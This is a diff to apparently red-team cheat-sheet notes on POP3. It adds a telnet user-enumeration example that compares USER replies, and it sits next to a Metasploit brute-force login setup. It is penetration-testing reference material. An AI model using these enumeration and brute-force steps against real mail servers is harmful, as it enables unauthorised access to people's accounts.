@@ -35,7 +35,9 @@ $ openssl s_client -connect IP:pop3s
 
 <div class="row row-cols-lg-2"><div>
 
-You may try to use [brute force](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md):
+#### Foothold
+
+* You may try to use [brute force](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md):
 
 ```shell!
 $ msfconsole -q
@@ -44,6 +46,16 @@ msf6> set USER_FILE /path/to/users.lst
 msf6> set PASS_FILE /path/to/pass.lst
 msf6> setg RHOST IP
 msf6> run
+```
+
+* You can try to use `USER`:
+
+```shell!
+$ telnet IP 110
+USER xxx
+-ERR
+USER yyy
++OK
 ```
 </div><div>
 </div></div>
